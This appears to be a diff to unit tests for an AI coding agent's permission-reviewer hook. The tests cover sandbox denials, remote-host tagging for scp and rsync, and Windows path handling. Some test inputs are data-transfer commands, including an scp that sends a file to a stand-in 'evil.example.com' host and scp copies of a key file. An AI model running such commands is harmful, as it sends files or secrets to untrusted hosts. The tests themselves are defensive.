@@ -8,6 +8,7 @@ import sys
 import tempfile
 import time
 import unittest
+from unittest import mock
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
 
@@ -482,22 +483,23 @@ class TestPermissionReviewer(unittest.TestCase):
         def fail_api(endpoint: str, payload: dict, timeout_sec: float) -> dict:
             raise AssertionError(f"Tier 2 should not run for sandbox network mismatch ({endpoint})")
 
-        for net_cmd in (
-            "git push origin main",
-            "/opt/homebrew/bin/gh pr list --repo org/repo",
-            'ssh dev-workstation "df -h"',
-        ):
-            res = review_hook.evaluate_tool_call(
-                {
-                    "conversationId": "c_net_sb",
-                    "workspacePaths": [ws],
-                    "cwd": ws,
-                    "toolCall": {"name": "run_command", "args": {"CommandLine": net_cmd, "BypassSandbox": False}},
-                },
-                api_caller=fail_api,
-            )
-            self.assertEqual(res["decision"], "deny", msg=f"Expected deny for sandboxed {net_cmd}")
-            self.assertIn("BypassSandbox=true", res["reason"])
+        with mock.patch.object(review_hook.sys, "platform", "darwin"):
+            for net_cmd in (
+                "git push origin main",
+                "/opt/homebrew/bin/gh pr list --repo org/repo",
+                'ssh dev-workstation "df -h"',
+            ):
+                res = review_hook.evaluate_tool_call(
+                    {
+                        "conversationId": "c_net_sb",
+                        "workspacePaths": [ws],
+                        "cwd": ws,
+                        "toolCall": {"name": "run_command", "args": {"CommandLine": net_cmd, "BypassSandbox": False}},
+                    },
+                    api_caller=fail_api,
+                )
+                self.assertEqual(res["decision"], "deny", msg=f"Expected deny for sandboxed {net_cmd}")
+                self.assertIn("BypassSandbox=true", res["reason"])
 
         # Same git push with BypassSandbox=True -> single native force_ask
         res_ok = review_hook.evaluate_tool_call(
@@ -546,25 +548,26 @@ class TestPermissionReviewer(unittest.TestCase):
             raise AssertionError(f"Tier 2 should not run here ({endpoint})")
 
         # Deterministically sandbox-incompatible commands with BypassSandbox=False deny immediately at Tier 0
-        for sb_cmd in (
-            "mpirun -np 3 build/test_mpi",
-            "/bin/zsh -lc 'mpirun -np 2 build/test_mpi'",
-            "tmux list-sessions",
-            "ps -ef",
-            "launchctl list",
-            "curl -s https://api.github.com/repos/org/repo",
-        ):
-            res = review_hook.evaluate_tool_call(
-                {
-                    "conversationId": "c_sb_incompat",
-                    "workspacePaths": [ws],
-                    "cwd": ws,
-                    "toolCall": {"name": "run_command", "args": {"CommandLine": sb_cmd, "BypassSandbox": False}},
-                },
-                api_caller=fail_api,
-            )
-            self.assertEqual(res["decision"], "deny", msg=f"Expected Tier 0 deny for sandboxed {sb_cmd!r}")
-            self.assertIn("BypassSandbox=true", res["reason"])
+        with mock.patch.object(review_hook.sys, "platform", "darwin"):
+            for sb_cmd in (
+                "mpirun -np 3 build/test_mpi",
+                "/bin/zsh -lc 'mpirun -np 2 build/test_mpi'",
+                "tmux list-sessions",
+                "ps -ef",
+                "launchctl list",
+                "curl -s https://api.github.com/repos/org/repo",
+            ):
+                res = review_hook.evaluate_tool_call(
+                    {
+                        "conversationId": "c_sb_incompat",
+                        "workspacePaths": [ws],
+                        "cwd": ws,
+                        "toolCall": {"name": "run_command", "args": {"CommandLine": sb_cmd, "BypassSandbox": False}},
+                    },
+                    api_caller=fail_api,
+                )
+                self.assertEqual(res["decision"], "deny", msg=f"Expected Tier 0 deny for sandboxed {sb_cmd!r}")
+                self.assertIn("BypassSandbox=true", res["reason"])
 
         # Loopback HTTP and grep containing |ps/|tmux inside quotes still fast-allow at Tier 0 in sandbox
         for ok_sb_cmd in (
@@ -811,18 +814,19 @@ class TestPermissionReviewer(unittest.TestCase):
         # 2. Workspace git write commands fail in sandbox (BypassSandbox=False) -> Tier 0 bounce,
         #    while read-only git status/stash list (BypassSandbox=False) and git add/commit (BypassSandbox=True) fast-allow,
         #    and external git -C /external/repo commit (BypassSandbox=False) is NOT blocked by workspace .git gate.
-        for ws_git_write in ("git add src/a.py", 'git commit -m "msg"'):
-            res_gw = review_hook.evaluate_tool_call(
-                {
-                    "conversationId": "c_blind_spots",
-                    "workspacePaths": [ws],
-                    "cwd": ws,
-                    "toolCall": {"name": "run_command", "args": {"CommandLine": ws_git_write, "BypassSandbox": False}},
-                },
-                api_caller=fail_api,
-            )
-            self.assertEqual(res_gw["decision"], "deny", msg=f"Expected Tier 0 bounce for sandboxed {ws_git_write!r}")
-            self.assertIn("BypassSandbox=true", res_gw["reason"])
+        with mock.patch.object(review_hook.sys, "platform", "darwin"):
+            for ws_git_write in ("git add src/a.py", 'git commit -m "msg"'):
+                res_gw = review_hook.evaluate_tool_call(
+                    {
+                        "conversationId": "c_blind_spots",
+                        "workspacePaths": [ws],
+                        "cwd": ws,
+                        "toolCall": {"name": "run_command", "args": {"CommandLine": ws_git_write, "BypassSandbox": False}},
+                    },
+                    api_caller=fail_api,
+                )
+                self.assertEqual(res_gw["decision"], "deny", msg=f"Expected Tier 0 bounce for sandboxed {ws_git_write!r}")
+                self.assertIn("BypassSandbox=true", res_gw["reason"])
 
         for ok_git, bypass in (
             ("git status", False),
@@ -1036,7 +1040,7 @@ class TestPermissionReviewer(unittest.TestCase):
             workspace_paths=[ws],
             cwd=ws,
         )
-        self.assertIn("/outside/Folder With Spaces/secret.txt", act_spaces["details"]["externalPaths"])
+        self.assertIn(os.path.normpath("/outside/Folder With Spaces/secret.txt"), act_spaces["details"]["externalPaths"])
 
         # 3. Cold-parse latency check: unique Tier-0 routine + inline python division commands average < 1.0 ms
         bench_cmds = [
@@ -1407,6 +1411,177 @@ class TestPermissionReviewer(unittest.TestCase):
                     cwd=ws,
                 )
                 self.assertTrue(act["details"]["isDestructiveOrDelete"])
+
+    def test_remote_transfer_host_tagging_and_mixed_host_safety(self) -> None:
+        local_cfg = self.tmp_path / "local_transfer.json"
+        local_cfg.write_text(
+            json.dumps({"known_ssh_hosts": ["backup-host", "dev-workstation"], "shared_hpc_hosts": ["cluster-login"]}),
+            encoding="utf-8",
+        )
+        review_hook.os.environ["AGY_PERMISSION_REVIEWER_LOCAL_CONFIG"] = str(local_cfg)
+        self.addCleanup(lambda: review_hook.os.environ.pop("AGY_PERMISSION_REVIEWER_LOCAL_CONFIG", None))
+        ws = "/workspace/project"
+
+        act_win = review_hook.build_requested_action(
+            "run_command",
+            {
+                "CommandLine": "scp /Users/alice/.config/backup/repo.key dev-workstation:/C:/Users/alice/.config/backup/repo.key",
+                "BypassSandbox": True,
+            },
+            workspace_paths=[ws],
+            cwd=ws,
+        )
+        self.assertEqual(act_win["details"].get("sshHost"), "dev-workstation")
+        self.assertTrue(act_win["details"].get("knownUserSshHost"))
+        self.assertNotIn("sharedHpcHost", act_win["details"])
+
+        act_backup = review_hook.build_requested_action(
+            "run_command",
+            {
+                "CommandLine": "scp -i ~/.ssh/mykey /Users/alice/.config/backup/repo.key backup-host:/srv/archives/repo.key",
+                "BypassSandbox": True,
+            },
+            workspace_paths=[ws],
+            cwd=ws,
+        )
+        self.assertEqual(act_backup["details"].get("sshHost"), "backup-host")
+        self.assertEqual(act_backup["details"].get("remoteHosts"), ["backup-host"])
+        self.assertTrue(act_backup["details"].get("knownUserSshHost"))
+
+        act_hpc = review_hook.build_requested_action(
+            "run_command",
+            {
+                "CommandLine": "rsync -az build/ cluster-login:/scratch/u/build/",
+                "BypassSandbox": True,
+            },
+            workspace_paths=[ws],
+            cwd=ws,
+        )
+        self.assertEqual(act_hpc["details"].get("sshHost"), "cluster-login")
+        self.assertTrue(act_hpc["details"].get("sharedHpcHost"))
+        self.assertTrue(act_hpc["details"].get("knownUserSshHost"))
+
+        act_unknown = review_hook.build_requested_action(
+            "run_command",
+            {
+                "CommandLine": "scp /tmp/a unknown-box:/tmp/x",
+                "BypassSandbox": True,
+            },
+            workspace_paths=[ws],
+            cwd=ws,
+        )
+        self.assertEqual(act_unknown["details"].get("sshHost"), "unknown-box")
+        self.assertNotIn("knownUserSshHost", act_unknown["details"])
+
+        act_mixed = review_hook.build_requested_action(
+            "run_command",
+            {
+                "CommandLine": "scp /tmp/a backup-host:/tmp/a && scp /tmp/a evil.example.com:/tmp/a",
+                "BypassSandbox": True,
+            },
+            workspace_paths=[ws],
+            cwd=ws,
+        )
+        self.assertEqual(act_mixed["details"].get("remoteHosts"), ["backup-host", "evil.example.com"])
+        self.assertNotIn("knownUserSshHost", act_mixed["details"])
+
+        act_local_rsync = review_hook.build_requested_action(
+            "run_command",
+            {
+                "CommandLine": "rsync -av ./local_dir /tmp/dest",
+                "BypassSandbox": True,
+            },
+            workspace_paths=[ws],
+            cwd=ws,
+        )
+        self.assertNotIn("remoteHosts", act_local_rsync["details"])
+        self.assertNotIn("knownUserSshHost", act_local_rsync["details"])
+
+    def test_cross_platform_launcher_windows_paths_and_opencode_exe_resolution(self) -> None:
+        import ntpath
+        import subprocess
+
+        repo_root = Path(__file__).resolve().parents[1]
+        hooks_cfg = json.loads((repo_root / "hooks.json").read_text(encoding="utf-8"))
+        hook_cmd = hooks_cfg["context-permission-reviewer"]["PreToolUse"][0]["hooks"][0]["command"]
+        self.assertEqual(hook_cmd, '"./scripts/run_hook.cmd"')
+
+        # 1. Polyglot launcher works directly from plugin root via native shell on POSIX and Windows
+        ws_path = r"C:\workspace\project" if os.name == "nt" else "/workspace/project"
+        file_path = r"C:\workspace\project\src\a.py" if os.name == "nt" else "/workspace/project/src/a.py"
+        hook_payload = json.dumps(
+            {
+                "conversationId": "c_launcher",
+                "workspacePaths": [ws_path],
+                "toolCall": {"name": "read_file", "args": {"Path": file_path}},
+            }
+        )
+        env = dict(os.environ)
+        env["PLUGIN_DATA"] = str(self.tmp_path / "launcher_data")
+        proc = subprocess.run(
+            hook_cmd if os.name == "nt" else ["/bin/sh", "-c", hook_cmd],
+            shell=(os.name == "nt"),
+            cwd=str(repo_root),
+            input=hook_payload,
+            text=True,
+            capture_output=True,
+            env=env,
+            check=False,
+        )
+        self.assertEqual(proc.returncode, 0, msg=f"stderr={proc.stderr!r}")
+        self.assertEqual(proc.stderr, "")
+        parsed_out = json.loads(proc.stdout.strip())
+        self.assertEqual(parsed_out["decision"], "auto_approve")
+
+        # 2. Windows npm `.cmd` shim resolves to real PE `opencode.exe` and skips un-postinstalled text stubs
+        npm_dir = self.tmp_path / "npm"
+        shim = npm_dir / "opencode.cmd"
+        exe = npm_dir / "node_modules" / "@opencode" / "cli" / "bin" / "opencode.exe"
+        arch_exe = (
+            npm_dir
+            / "node_modules"
+            / "@opencode"
+            / "cli"
+            / "node_modules"
+            / "@opencode"
+            / "cli-windows-x64"
+            / "bin"
+            / "opencode.exe"
+        )
+        shim.parent.mkdir(parents=True, exist_ok=True)
+        exe.parent.mkdir(parents=True, exist_ok=True)
+        arch_exe.parent.mkdir(parents=True, exist_ok=True)
+        shim.write_text("@ECHO off\n", encoding="utf-8")
+        exe.write_bytes(b'echo "Error: @opencode/cli postinstall did not run"\n')
+        arch_exe.write_bytes(b"MZ_ARCH")
+        self.assertEqual(llm_classifier._resolve_windows_opencode_exe(str(shim)), str(arch_exe))
+
+        exe.write_bytes(b"MZ_TOP")
+        self.assertEqual(llm_classifier._resolve_windows_opencode_exe(str(shim)), str(exe))
+
+        # 3. `is_path_under` handles Windows backslashes, case-insensitivity, and drive roots
+        with mock.patch.object(intent_extractor.os, "sep", "\\"), \
+             mock.patch.object(intent_extractor.os.path, "normpath", side_effect=ntpath.normpath), \
+             mock.patch.object(intent_extractor.os.path, "normcase", side_effect=ntpath.normcase):
+            self.assertTrue(
+                intent_extractor.is_path_under(r"C:\Users\Alice\proj\a.py", r"c:\users\alice\proj")
+            )
+            self.assertFalse(
+                intent_extractor.is_path_under(r"C:\Users\Alice\proj2\a.py", r"C:\Users\Alice\proj")
+            )
+            self.assertTrue(
+                intent_extractor.is_path_under(r"C:\Windows\System32\cmd.exe", "C:\\")
+            )
+
+        # 4. Windows drive-letter paths are extracted from strings and command arguments
+        self.assertEqual(
+            intent_extractor.extract_paths_from_string(r"C:\Users\alice\proj\a.py"),
+            [os.path.normpath(r"C:\Users\alice\proj\a.py")],
+        )
+        self.assertIn(
+            os.path.normpath(r"C:\Windows\System32\drivers\etc\hosts"),
+            intent_extractor.extract_paths_from_string(r'open("C:\Windows\System32\drivers\etc\hosts")'),
+        )
 
 
 if __name__ == "__main__":
